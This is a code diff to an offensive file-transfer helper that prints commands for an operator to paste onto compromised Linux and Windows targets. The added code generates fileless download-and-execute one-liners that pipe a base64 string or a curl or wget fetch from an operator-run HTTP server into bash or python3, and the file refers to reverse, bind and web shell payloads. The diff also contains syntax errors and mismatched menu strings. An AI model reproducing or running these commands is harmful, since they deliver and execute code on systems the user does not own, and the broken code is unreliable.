@@ -40,7 +40,12 @@ PSFrom_Methods = [
 
 # UPLOAD TO LINUX TARGET METHODS
 UploadTo_NixMethods = [
-    'Base64'
+    'Base64',
+    'Base64 - Fileless',
+    'HTTP',
+    'HTTP - Fileless'
+    '/dev/tcp',
+    'SCP'
 ]
 
 # UPLOAD FROM LINUX TARGET METHODS (NEED TO ADD 'SMB', 'FTP', 'WebDAV')
@@ -52,6 +57,11 @@ UploadFrom_NixMethods = [
 Download_Methods = [
     'wget',
     'cURL'
+]
+
+Fileless_Types = [
+    'BASH (.sh)',
+    'Python (.py)'
 ]
 
 # PASTABLES OUTPUT TEMPLATE
@@ -105,7 +115,7 @@ def listening_ip_address():
             return ip_list[int(choice)-1]
         else:
             print('Invalid choice. Try again.')
-
+    
 # GET ABSOLUTE PATH OF FILE ON TARGET
 def get_absolute_path():
     print('[?] What is the absolute path of the file on target: ', end='')
@@ -116,11 +126,7 @@ def get_absolute_path():
         sys.exit(0)
 
 # START HTTP SERVER AND CREATE COPY OF FILE TO BE TRANSFERRED
-def start_http_server(relpath):
-    listen_ip = listening_ip_address()
-    listen_port = '443'
-
-    # START PYTHON HTTP SERVER
+def start_http_server(listen_ip, listen_port, relpath):
     print('[+] Starting HTTP server on ' + listen_ip + ':443 ...')
     try:
         pyserver = subprocess.Popen(['python', '-m', 'http.server', '-b', listen_ip, '443'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -133,14 +139,14 @@ def start_http_server(relpath):
         sys.exit(1)
 
     # COPY FILE TO BE TRANSFERRED TO CURRENT DIRECTORY
-    cmd = 'cp ' + relpath + ' .'
+    cmd = 'cp ' + relpath + ' tmp'
     try:
         subprocess.run(cmd, shell=True)
     except:
         print('[!] Could not temporarily copy file to current directory')
 
 # STOP HTTP SERVER AND DELETE COPY OF FILE TO BE TRANSFERRED
-def terminate_http_server(filename):
+def terminate_http_server():
     # TERMINATE HTTP SERVER
     print('[?] Close HTTP server? [Y/n] ', end='')
     time.sleep(1)
@@ -161,7 +167,7 @@ def terminate_http_server(filename):
             print('[!] Could not terminate Python HTTP server')
 
     # REMOVE TEMPORARY FILE
-    cmd = 'rm ' + filename
+    cmd = 'rm tmp'
     try:
         subprocess.run(cmd, shell=True)
     except:
@@ -194,6 +200,19 @@ def download_file(args):
 
     # DOWNLOAD
     subprocess.run(cmd, shell=True)
+
+# GENERATE AND VERIFY HASH
+def verify_hash(relpath):
+    original_md5 = hashlib.md5(open(relpath, 'rb').read()).hexdigest()
+    try:
+        print('[?] Paste MD5 checksum output here to compare: ', end='')
+        remote_md5 = input()
+        if original_md5 == remote_md5:
+            print('[+] MD5 checksum matches! You\'re good to go.')
+        else:
+            print('[-] Uh-oh... MD5 checksum doesn\'t match. Try again.')
+    except KeyboardInterrupt:
+        sys.exit(0)
 
 # CREATE A REVERSE, BIND, OR WEB SHELL PAYLOAD
 def create_payload(args):
@@ -267,10 +286,13 @@ def upload_to(args):
         ### WINDOWS HTTP METHOD ###
         ###########################
         if method == 'HTTP':
-            start_http_server(relpath)
+            listen_ip = listening_ip_address()
+            listen_port = '443'
+
+            start_http_server(listen_ip, listen_port, relpath)
             
-            # TARGET PASTABLES
-            entrymsg = '[+] Select windows download method:'
+            # PASTABLES
+            entrymsg = '[+] Select windows target download method:'
             choice = dynamic_populated_choices(entrymsg, PSTo_Methods)
             if choice == 'DownloadFile':
                 print('[+] DownloadFile method selected')
@@ -312,7 +334,7 @@ def upload_to(args):
             cmd = startcmd + endcmd
             pastables(cmd)
 
-            terminate_http_server(args.filename)
+            terminate_http_server()
 
             # if args.firstlaunch:
             #     command = startcmd + ' -UseBasicParsing' + endcmd
@@ -324,31 +346,17 @@ def upload_to(args):
         #############################
         elif method == 'Base64':
             print('[+] Generating Base64 string of file')
-            b64_file = subprocess.run(['base64', '-w', '0', relpath], capture_output=True, text=True)
-            md5h = hashlib.md5(open(relpath, 'rb').read()).hexdigest()
+            cmd = 'cat ' + relpath + ' | base64 -w 0'
+            proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE)
+            b64 = proc.stdout.decode()
             print('[+] Run this command on target')
 
-            if args.os == 'windows':
-                cmd = '[IO.File]::WriteAllBytes(\"' + '.\", [Convert]::FromBase64String(\"' + b64_file.stdout + '")); Get-FileHash ' + args.filename + ' -Algorithm md5'
-                if len(cmd) > 8191:
-                    print('[!] cmd.exe has a maximum string length of 8,191 characters.')
-                    sys.exit(0)
-            elif args.os == 'linux':
-                cmd = 'echo -n \'' + b64_file.stdout + '\' | base64 -d > ' + args.filename + ' && md5sum ' + args.filename
-            pastables(cmd)
+            cmd = '[IO.File]::WriteAllBytes(\"' + '.\", [Convert]::FromBase64String(\"' + b64 + '")); Get-FileHash ' + args.filename + ' -Algorithm md5'
+            if len(cmd) > 8191:
+                print('[!] cmd.exe has a maximum string length of 8,191 characters.')
+                sys.exit(0)
 
-            # VERIFY MD5 HASH
-            while(True):
-                try:
-                    print('[?] Paste MD5 checksum output here to compare: ', end='')
-                    md5c = input()
-                    if md5c == md5h:
-                        print('[+] MD5 checksum matches! You\'re good to go.')
-                        break
-                    else:
-                        print('[-] Uh-oh... MD5 checksum doesn\'t match. Try again.')
-                except KeyboardInterrupt:
-                    sys.exit(0)
+            verify_hash(relpath)
 
         ##########################
         ### WINDOWS SCP METHOD ###
@@ -381,8 +389,9 @@ def upload_to(args):
         ###########################
         ### LINUX BASE64 METHOD ###
         ###########################
-        if method == 'Base64':
+        if method == 'Base64' or method == 'Base64 - Fileless':
             # GENERATE BASE64 STRING
+            print('[+] Generating Base64 string of file')
             cmd = 'cat ' + relpath + ' | base64 -w 0'
             try:
                 proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE)
@@ -390,9 +399,53 @@ def upload_to(args):
             except KeyboardInterrupt:
                 print('[!] File not found')
 
-            cmd = '# CREATE ' + args.filename.upper() + ' ON TARGET\n'
-            cmd += 'echo -n \'' + b64 + ' | base64 -d > ' + args.filename    
+            # PASTABLES
+            if method == 'Base64':
+                cmd = '# CREATE ' + args.filename.upper() + ' ON TARGET\n'
+                cmd += 'echo -n \'' + b64 + ' | base64 -d > ' + args.filename
+            elif method == 'Base64 - Fileless':
+                cmd = '# EXECUTE ' + args.filename.upper() + ' ON TARGET\n'
+                cmd += 'echo -n \'' + b64 + ' | base64 -d | bash'
             pastables(cmd)
+
+            verify_hash(relpath)
+        
+        #########################
+        ### LINUX HTTP METHOD ###
+        #########################
+        if method == 'HTTP' or method == 'HTTP - Fileless':
+            listen_ip = listening_ip_address()
+            listen_port = '443'
+
+            entrymsg = '[+] Select windows target download method:'
+            choice = dynamic_populated_choices(entrymsg, Download_Methods)
+            if choice == 'cURL':
+                if method == 'HTTP':
+                    cmd = '# CREATE ' + args.filename.upper() + ' ON TARGET\n'
+                    cmd += 'curl http://' + listen_ip + ':' + listen_port + '/' + args.filename + ' -o ' + args.filename
+                elif method == 'HTTP - Fileless':
+                    entrymsg = '[+] Select file type being uploaded:'
+                    choice = dynamic_populated_choices(entrymsg, Fileless_Types)
+                    cmd = '# EXECUTE ' + args.filename.upper() + ' ON TARGET\n'
+                    if choice == 'BASH script (.sh)':
+                        cmd += 'curl http://' + listen_ip + ':' + listen_port + '/' + args.filename + ' | bash'
+                    elif choice == 'Python script (.py)'
+                        cmd += 'curl http://' + listen_ip + ':' + listen_port + '/' + args.filename + ' | python3'
+            if choice == 'wget':
+                if method == 'HTTP':
+                    cmd = '# CREATE ' + args.filename.upper() + ' ON TARGET\n'
+                    cmd += 'wget http://' + listen_ip + ':' + listen_port + '/' + args.filename
+                elif method == 'HTTP - Fileless':
+                    entrymsg = '[+] Select file type being uploaded:'
+                    choice = dynamic_populated_choices(entrymsg, Fileless_Types)
+                    cmd = '# EXECUTE ' + args.filename.upper() + ' ON TARGET\n'
+                    if choice == 'BASH script (.sh)':
+                        cmd += 'wget -qO- http://' + listen_ip + ':' + listen_port + '/' + args.filename + ' | bash'
+                    elif choice == 'Python script (.py)'
+                        cmd += 'wget -qO- http://' + listen_ip + ':' + listen_port + '/' + args.filename + ' | python3'
+
+            start_http_server(listen_ip, listen_port, relpath)
+            terminate_http_server()
 
 # UPLOAD FILES FROM
 def upload_from(args):
